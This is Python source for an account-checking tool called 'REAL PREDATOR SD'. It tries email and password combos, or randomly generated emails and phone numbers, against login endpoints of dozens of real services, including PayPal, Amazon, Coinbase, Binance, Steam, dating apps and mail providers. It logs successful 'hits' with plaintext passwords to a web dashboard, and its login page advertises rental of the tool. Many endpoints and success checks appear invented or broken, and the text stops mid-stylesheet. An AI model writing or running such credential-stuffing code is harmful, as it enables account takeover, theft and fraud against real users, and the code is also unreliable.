    def check_steam(self, email, password, session):
        try:
            resp = session.get("https://store.steampowered.com/login/", timeout=8)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://store.steampowered.com/login/dologin/", 
                               data={"username": email, "password": password, "csrf_token": csrf.group(1)}, 
                               timeout=8)
            
            if '"success":true' in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_twitch(self, email, password, session):
        try:
            login = session.post("https://id.twitch.tv/oauth2/token", 
                               data={"client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko", 
                                     "login": email, "password": password, 
                                     "grant_type": "password"}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_reddit(self, email, password, session):
        try:
            login = session.post("https://www.reddit.com/api/login", 
                               data={"user": email, "passwd": password}, timeout=8)
            if login.status_code == 200 and '"success":true' in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_yahoo(self, email, password, session):
        try:
            resp = session.get("https://login.yahoo.com/", timeout=8)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://login.yahoo.com/account/login", 
                               data={"username": email, "password": password, 
                                     "csrf_token": csrf.group(1)}, 
                               allow_redirects=True, timeout=8)
            
            if "mail.yahoo.com" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_linkedin(self, email, password, session):
        try:
            resp = session.get("https://www.linkedin.com/login", timeout=8)
            csrf = re.search(r'name="csrfToken"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://www.linkedin.com/checkpoint/lg/login-submit", 
                               data={"session_key": email, "session_password": password, 
                                     "csrfToken": csrf.group(1)}, 
                               allow_redirects=True, timeout=8)
            
            if "feed" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_whatsapp(self, email, password, session):
        try:
            login = session.get("https://web.whatsapp.com/", timeout=8)
            if login.status_code == 200:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_telegram(self, email, password, session):
        try:
            login = session.post("https://my.telegram.org/auth", 
                               data={"phone": email, "password": password}, timeout=8)
            if login.status_code == 200 and "auth_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_amazon(self, email, password, session):
        try:
            resp = session.get("https://www.amazon.com/ap/signin", timeout=8)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://www.amazon.com/ap/signin", 
                               data={"email": email, "password": password, 
                                     "csrf_token": csrf.group(1)}, 
                               allow_redirects=True, timeout=8)
            
            if "your-account" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_paypal(self, email, password, session):
        try:
            resp = session.get("https://www.paypal.com/signin", timeout=8)
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://www.paypal.com/signin", 
                               data={"login_email": email, "login_password": password, 
                                     "csrf_token": csrf.group(1)}, 
                               allow_redirects=True, timeout=8)
            
            if "myaccount" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_epic(self, email, password, session):
        try:
            login = session.post("https://www.epicgames.com/id/api/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_riot(self, email, password, session):
        try:
            login = session.post("https://auth.riotgames.com/api/v1/authorization", 
                               json={"client_id": "riot-client", 
                                     "username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_playstation(self, email, password, session):
        try:
            login = session.post("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_xbox(self, email, password, session):
        try:
            login = session.post("https://login.live.com/oauth20_authorize.srf", 
                               data={"login": email, "passwd": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_tinder(self, email, password, session):
        try:
            login = session.post("https://api.gotinder.com/v2/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_bumble(self, email, password, session):
        try:
            login = session.post("https://bumble.com/api/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_binance(self, email, password, session):
        try:
            login = session.post("https://www.binance.com/api/v1/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_coinbase(self, email, password, session):
        try:
            login = session.post("https://api.coinbase.com/v2/oauth/token", 
                               json={"grant_type": "password", 
                                     "username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_github(self, email, password, session):
        try:
            resp = session.get("https://github.com/login", timeout=8)
            csrf = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf:
                return None, 'bad'
            
            login = session.post("https://github.com/session", 
                               data={"login": email, "password": password, 
                                     "authenticity_token": csrf.group(1)}, 
                               allow_redirects=True, timeout=8)
            
            if "github.com" in login.url and "login" not in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_apple(self, email, password, session):
        try:
            login = session.post("https://idmsa.apple.com/appleauth/auth/signin", 
                               json={"accountName": email, "password": password}, timeout=8)
            if login.status_code == 200 and "authType" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_zoom(self, email, password, session):
        try:
            login = session.post("https://zoom.us/signin", 
                               data={"email": email, "password": password}, timeout=8)
            if "dashboard" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_skype(self, email, password, session):
        try:
            login = session.post("https://login.skype.com/login", 
                               data={"username": email, "password": password}, timeout=8)
            if login.status_code == 200:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_signal(self, email, password, session):
        try:
            login = session.post("https://signal.org/api/v1/accounts/login", 
                               json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_wechat(self, email, password, session):
        try:
            login = session.post("https://web.wechat.com/cgi-bin/wechat/login", 
                               data={"username": email, "password": password}, timeout=8)
            if "success" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_line(self, email, password, session):
        try:
            login = session.post("https://api.line.me/v2/oauth/login", 
                               json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_viber(self, email, password, session):
        try:
            login = session.post("https://account.viber.com/login", 
                               data={"username": email, "password": password}, timeout=8)
            if login.status_code == 200:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_okcupid(self, email, password, session):
        try:
            login = session.post("https://www.okcupid.com/login", 
                               data={"email": email, "password": password}, timeout=8)
            if "dashboard" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_grindr(self, email, password, session):
        try:
            login = session.post("https://api.grindr.com/v1/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_badoo(self, email, password, session):
        try:
            login = session.post("https://badoo.com/api/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_hinge(self, email, password, session):
        try:
            login = session.post("https://api.hinge.com/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_pinterest(self, email, password, session):
        try:
            login = session.post("https://www.pinterest.com/resource/UserLoginResource/get/", 
                               data={"email": email, "password": password}, timeout=8)
            if '"success":true' in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_tumblr(self, email, password, session):
        try:
            login = session.post("https://www.tumblr.com/api/login", 
                               data={"email": email, "password": password}, timeout=8)
            if login.status_code == 200:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_hulu(self, email, password, session):
        try:
            login = session.post("https://auth.hulu.com/api/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_disney(self, email, password, session):
        try:
            login = session.post("https://www.disneyplus.com/api/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_hbomax(self, email, password, session):
        try:
            login = session.post("https://auth.hbomax.com/api/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_kraken(self, email, password, session):
        try:
            login = session.post("https://api.kraken.com/0/private/Login", 
                               json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_robinhood(self, email, password, session):
        try:
            login = session.post("https://api.robinhood.com/api/v1/auth/login", 
                               json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_muzz(self, email, password, session):
        try:
            login = session.post("https://api.muzz.com/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_shaadi(self, email, password, session):
        try:
            login = session.post("https://api.shaadi.com/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_ubisoft(self, email, password, session):
        try:
            login = session.post("https://api.ubisoft.com/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_nintendo(self, email, password, session):
        try:
            login = session.post("https://api.nintendo.com/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_protonmail(self, email, password, session):
        try:
            login = session.post("https://api.protonmail.com/auth", 
                               json={"Username": email, "Password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_mailcom(self, email, password, session):
        try:
            login = session.post("https://api.mail.com/v1/auth/login", 
                               json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_yandex(self, email, password, session):
        try:
            login = session.post("https://passport.yandex.com/auth", 
                               data={"login": email, "passwd": password}, timeout=8)
            if "mail.yandex.com" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'
    
    def check_aol(self, email, password, session):
        try:
            login = session.post("https://login.aol.com/account/login", 
                               data={"username": email, "password": password}, timeout=8)
            if "mail" in login.url:
                return {'success': True}, 'hit'
            return None, 'bad'
        except:
            return None, 'error'

# ================================================================
# STATE
# ================================================================
state = {
    'running': False,
    'checked': 0,
    'hits': 0,
    'errors': 0,
    'feed': [],
    'results': [],
    'lock': threading.Lock()
}

predator = UltimatePredator()

# ================================================================
# MAIN PREDATOR LOOP
# ================================================================
def predator_loop():
    while state['running']:
        try:
            batch_size = 10
            
            inputs_to_try = []
            
            if predator.combos:
                for _ in range(min(batch_size, len(predator.combos))):
                    combo = predator.combos.pop(0)
                    inputs_to_try.append(combo[0])
            else:
                for _ in range(batch_size):
                    if random.random() < 0.5:
                        name = random.choice(['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed'])
                        num = str(random.randint(1, 999))
                        domain = random.choice(['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com'])
                        inputs_to_try.append(f"{name}{num}@{domain}")
                    else:
                        code = random.choice(PHONE_CODES)
                        number = ''.join(str(random.randint(0,9)) for _ in range(random.randint(7, 10)))
                        inputs_to_try.append(code + number)
            
            for input_text in inputs_to_try:
                if not state['running']:
                    break
                
                results = predator.smart_hunt(input_text)
                
                with state['lock']:
                    state['checked'] += 1
                    for result in results:
                        if result['status'] == 'hit':
                            state['hits'] += 1
                            state['results'].append(result)
                            state['feed'].append({
                                'type': 'hit',
                                'text': f"🎯 {result['platform']} | {result['username']} | 🔑 {result['password']}",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
            
            time.sleep(random.uniform(0.3, 1.0))
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
            time.sleep(2)

# ================================================================
# FLASK ROUTES WITH BEAUTIFUL TEMPLATES
# ================================================================
# [LOGIN_TEMPLATE and DASHBOARD_TEMPLATE remain the same as before with full design]

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR SD - Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace;overflow:hidden}
.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.particle{position:absolute;width:2px;height:2px;background:#00ff41;border-radius:50%;animation:float linear infinite}
@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-10vh) scale(1);opacity:0}}
.login-box{position:relative;z-index:1;background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px 35px;width:420px;max-width:95%;text-align:center;backdrop-filter:blur(20px);box-shadow:0 0 80px rgba(0,255,65,0.03)}
.logo{display:flex;align-items:center;justify-content:center;gap:15px;margin-bottom:10px}
.whatsapp-pulse{display:inline-flex;align-items:center;justify-content:center;width:65px;height:65px;border-radius:50%;background:linear-gradient(135deg,#25D366,#128C7E);cursor:pointer;transition:all 0.3s;animation:pulse-wa 2s ease-in-out infinite;box-shadow:0 0 60px rgba(37,211,102,0.4);text-decoration:none;border:none}
@keyframes pulse-wa{0%,100%{transform:scale(1);box-shadow:0 0 40px rgba(37,211,102,0.4)}50%{transform:scale(1.12);box-shadow:0 0 100px rgba(37,211,102,0.7),0 0 160px rgba(37,211,102,0.2)}}
.whatsapp-pulse i{font-size:32px;color:#fff}
.whatsapp-pulse:hover{transform:scale(1.15);box-shadow:0 0 120px rgba(37,211,102,0.6)}
.logo-text{font-family:'Orbitron',monospace;font-size:28px;color:#00ff41;text-shadow:0 0 60px rgba(0,255,65,0.15)}
.logo-text span{color:#ff0044;text-shadow:0 0 60px rgba(255,0,68,0.2)}
.logo-text .sd{font-size:16px;color:#ffd700;background:rgba(255,215,0,0.1);padding:2px 12px;border-radius:4px;border:1px solid rgba(255,215,0,0.2)}
.subtitle{color:#006622;font-size:10px;margin-bottom:20px;letter-spacing:4px}
.input-group{position:relative;margin-bottom:15px}
.input-group input{width:100%;padding:14px 20px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:16px;font-family:'Share Tech Mono',monospace;transition:all 0.3s;text-align:center;letter-spacing:3px}
.input-group input:focus{outline:none;border-color:#00ff41;box-shadow:0 0 50px rgba(0,255,65,0.05)}
.input-group input::placeholder{color:#006622}
.btn-login{width:100%;padding:14px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;font-family:'Orbitron',monospace;letter-spacing:3px;text-transform:uppercase}
.btn-login:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 80px rgba(0,255,65,0.1);transform:scale(1.02)}
.btn-login:disabled{opacity:0.4;cursor:not-allowed}
.error-msg{color:#ff0044;font-size:11px;margin-top:8px;min-height:20px}
.hint{color:#006622;font-size:8px;margin-top:10px}
.footer{margin-top:18px;color:#006622;font-size:8px;letter-spacing:1px;border-top:1px solid rgba(0,255,65,0.05);padding-top:12px}
.social-buttons{display:flex;justify-content:center;gap:10px;margin-top:6px;flex-wrap:wrap}
.social-btn{display:inline-flex;align-items:center;gap:8px;padding:8px 20px;border-radius:30px;font-size:12px;font-weight:700;text-decoration:none;transition:all 0.3s;border:none;cursor:pointer}
.social-btn.whatsapp{background:#25D366;color:#fff;box-shadow:0 0 30px rgba(37,211,102,0.2)}
.social-btn.whatsapp:hover{transform:scale(1.08);box-shadow:0 0 60px rgba(37,211,102,0.4)}
.social-btn.telegram{background:#0088CC;color:#fff;box-shadow:0 0 30px rgba(0,136,204,0.2)}
.social-btn.telegram:hover{transform:scale(1.08);box-shadow:0 0 60px rgba(0,136,204,0.4)}
.social-btn.rent{background:rgba(255,215,0,0.12);color:#ffd700;border:1px solid rgba(255,215,0,0.15)}
.social-btn.rent:hover{background:rgba(255,215,0,0.2);transform:scale(1.05)}
.copyright{font-size:7px;color:#003322;margin-top:6px}
</style>
</head>
<body>
<div class="particles" id="particles"></div>
<div class="login-box">
    <div class="logo">
        <div class="whatsapp-pulse" onclick="window.open('https://whatsapp.com/channel/0029Vb8vFQw2kNFqPIWe3B3H','_blank')">
            <i class="fab fa-whatsapp"></i>
        </div>
        <div class="logo-text">REAL <span>PREDATOR</span> <span class="sd">SD</span></div>
    </div>
    <div class="subtitle">⚡ v31.0 ULTIMATE HUNTER</div>
    <div class="input-group">
        <input type="password" id="passInput" placeholder="🔑 Enter Password" autocomplete="off">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
    <div class="hint">🔐 Secure Access Only</div>
    <div class="footer">
        <div class="social-buttons">
            <a href="https://wa.me/249907118667" target="_blank" class="social-btn whatsapp"><i class="fab fa-whatsapp" style="font-size:16px;"></i> WhatsApp</a>
            <a href="https://t.me/MRDPY" target="_blank" class="social-btn telegram"><i class="fab fa-telegram" style="font-size:16px;"></i> Telegram</a>
            <a href="#" onclick="alert('Rental contact:\\nWhatsApp: +249907118667\\nTelegram: @MRDPY')" class="social-btn rent"><i class="fas fa-clock"></i> Rent</a>
        </div>
        <div class="copyright">© 2026 REAL PREDATOR SD | Developer: @MRDPY</div>
    </div>
</div>
<script>
function createParticles(){const c=document.getElementById('particles');for(let i=0;i<80;i++){const p=document.createElement('div');p.className='particle';p.style.left=Math.random()*100+'%';p.style.width=p.style.height=(1+Math.random()*2)+'px';p.style.animationDuration=(15+Math.random()*25)+'s';p.style.animationDelay=(Math.random()*20)+'s';c.appendChild(p);}}
createParticles();
const passInput=document.getElementById('passInput'),loginBtn=document.getElementById('loginBtn'),errorMsg=document.getElementById('errorMsg');
passInput.addEventListener('keypress',e=>{if(e.key==='Enter')doLogin();});
loginBtn.addEventListener('click',doLogin);
function doLogin(){const password=passInput.value.trim();if(!password){errorMsg.textContent='⚠️ Enter password';return;}loginBtn.disabled=true;loginBtn.textContent='⏳...';errorMsg.textContent='';fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:password})}).then(res=>res.json()).then(data=>{loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';if(data.success){window.location.href='/dashboard';}else{errorMsg.textContent='❌ '+data.error;passInput.value='';}}).catch(()=>{loginBtn.disabled=false;loginBtn.textContent='⚡ ACCESS';errorMsg.textContent='⚠️ Error';});}
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR SD v31.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh}
::-webkit-scrollbar{width:3px}
::-webkit-scrollbar-track{background:#111}
::-webkit-scrollbar-thumb{background:#00ff41;border-radius:10px}
.container{max-width:1500px;margin:0 auto;padding:8px}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:8px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-radius:8px 8px 0 0}
.header-left{display:flex;align-items:center;gap:15px}
.whatsapp-pulse{display:inline-flex;align-items:center;justify-content:center;width:55px;height:55px;border-radius:50%;background:linear-gradient(135deg,#25D366,#128C7E);cursor:pointer;transition:all 0.3s;animation:pulse-wa 2s ease-in-out infinite;box-shadow:0 0 50px rgba(37,211,102,0.4);text-decoration:none;border:none}
@keyframes pulse-wa{0%,100%{transform:scale(1);box-shadow:0 0 30px rgba(37,211,102,0.4)}50%{transform:scale(1.1);box-shadow:0 0 80px rgba(37,211,102,0.7),0 0 120px rgba(37,211,102,0.2)}}
.whatsapp-pulse i{font-size:28px;color:#fff}
.whatsapp-pulse:hover{transform:scale(1.12)}
.header h1{font-size:20px;font-family:'Orbitron',monospace;color:#00ff41;margin:0}
.header h1 span{color:#ff0044}
.header .sd{font-size:14px;color:#ffd700;background:rgba(255,215,0,0.1);padding:2px 10px;border-radius:4px;border:1px solid rgba(255,215,0,0.2)}
.binary-badge{font-size:9px;color:#ffd700;border:1px solid rgba(255,215,0,0.15);padding:2px 12px;border-radius:12px}
.social-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 24px;border-radius:30px;font-size:14px;font-weight:700;text-decoration:none;transition:all 0.3s;border:none;cursor:pointer}
.social-btn.whatsapp{background:#25D366;color:#fff;box-shadow:0 0 30px rgba(37,211,102,0.2)}
.social-btn.whatsapp:hover{transform:scale(1.06);box-shadow:0 0 60px rgba(37,211,102,0.4)}
.social-btn.telegram{background:#0088CC;color:#fff;box-shadow:0 0 30px rgba(0,136,204,0.2)}
.social-btn.telegram:hover{transform:scale(1.06);box-shadow:0 0 60px rgba(0,136,204,0.4)}
.social-btn.rent{background:rgba(255,215,0,0.12);color:#ffd700;border:1px solid rgba(255,215,0,0.15)}
.social-btn.rent:hover{background:rgba(255,215,0,0.2);transform:scale(1.05)}
.btn-logout{border-color:#ff0044;color:#ff0044}
.top-bar{display:flex;justify-content:space-between;align-items:center;padding:6px 15px;background:rgba(0,0,0,0.5);border-radius:6px;margin-bottom:4px;flex-wrap:wrap;gap:5px}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.1);color:#00ff41;padding:4px 12px;border-radius:4px;font-size:9px;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace}
.btn:hover{background:rgba(0,255,65,0.05);border-color:#00ff41;transform:scale(1.02)}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start:hover:not(:disabled){box-shadow:0 0 60px rgba(0,255,65,0.1)}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:8px 12px;margin-bottom:4px;transition:all 0.3s}
.card:hover{border-color:rgba(0,255,65,0.12)}
.card-title{font-size:11px;color:#00cc33;margin-bottom:4px;display:flex;align-items:center;gap:6px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:3px;margin-bottom:4px}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:4px;padding:5px;text-align:center}
.stat-box .num{font-size:18px;font-weight:700;display:block}
.stat-box .label{font-size:7px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.red .num{color:#ff0044}
.stat-box.gold .num{color:#ffd700}
.progress-bar{height:4px;background:rgba(0,255,65,0.05);border-radius:2px;overflow:hidden}
.progress-bar .fill{height:100%;background:linear-gradient(90deg,#ff0044,#ffd700,#00ff41);width:0%;transition:width 0.5s}
.progress-text{font-size:8px;color:#006622;display:flex;justify-content:space-between;margin-top:2px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(70px,1fr));gap:4px;margin:6px 0}
.platform-badge{padding:6px 4px;border-radius:6px;text-align:center;font-size:8px;border:1px solid rgba(0,255,65,0.06);background:rgba(0,0,0,0.6);color:#006622;cursor:pointer;transition:all 0.3s}
.platform-badge:hover{background:rgba(0,255,65,0.05);border-color:#00ff41;transform:scale(1.05)}
.platform-badge.selected{background:rgba(0,255,65,0.1);border-color:#00ff41;color:#00ff41;box-shadow:0 0 30px rgba(0,255,65,0.05)}
.platform-badge.gaming{border-color:#ffd700;color:#ffd700}
.platform-badge.gaming.selected{background:rgba(255,215,0,0.1);border-color:#ffd700}
.platform-badge .icon{font-size:18px;display:block;margin-bottom:2px}
.control-bar{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row input{padding:4px 8px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:9px;font-family:'Share Tech Mono',monospace;width:50px}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row label{color:#006622;font-size:8px}
.feed-container{max-height:140px;overflow-y:auto}
.feed-item{padding:3px 8px;font-size:8px;border-left:2px solid transparent;animation:slideIn 0.3s;display:flex;align-items:center;gap:5px}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item.info{background:rgba(0,136,255,0.04);border-left-color:#0088ff}
.feed-item .time{color:#006622;font-size:6px;min-width:25px;display:inline-block}
.result-container{max-height:400px;overflow-y:auto}
.result-item{padding:5px 10px;font-size:8px;border-bottom:1px solid rgba(0,255,65,0.05);white-space:pre-wrap;word-break:break-all}
.result-item.gaming{background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.1);border-radius:4px;margin-bottom:2px}
.status-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 12px;border-radius:6px;font-size:9px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044;animation:pulse-border 2s infinite}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:5px;height:5px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse-dot 1.5s infinite}
.status-dot.stopped{background:#00ff41}
@keyframes pulse-dot{0%,100%{box-shadow:0 0 20px rgba(255,0,68,0.3)}50%{box-shadow:0 0 60px rgba(255,0,68,0.6)}}
@keyframes pulse-border{0%,100%{border-color:#ff0044}50%{border-color:rgba(255,0,68,0.3)}}
@keyframes slideIn{from{opacity:0;transform:translateX(-15px)}to{opacity:1;transform:translateX(0)}}
.empty-state{text-align:center;padding:12px;color:#006622;font-size:9px}
.viewers-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 14px;border-radius:20px;background:rgba(0,255,65,0.05);border:1px solid rgba(0,255,65,0.1);font-size:12px;font-weight:700}
.viewers-badge .eye{animation:glow-eye 2s ease-in-out infinite}
@keyframes glow-eye{0%,100%{color:#00ff41}50%{color:#ffd700;text-shadow:0 0 20px #ffd700}}
.platform-select{display:flex;gap:10px;align-items:center;margin:10px 0;flex-wrap:wrap;background:rgba(0,0,0,0.5);padding:8px;border-radius:6px;border:1px solid rgba(0,255,65,0.05)}
.platform-select select{padding:8px 12px;background:rgba(0,0,0,0.8);color:#00ff41;border:1px solid #00ff41;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:11px;min-width:200px}
.platform-select select:focus{outline:none;box-shadow:0 0 30px rgba(0,255,65,0.05)}
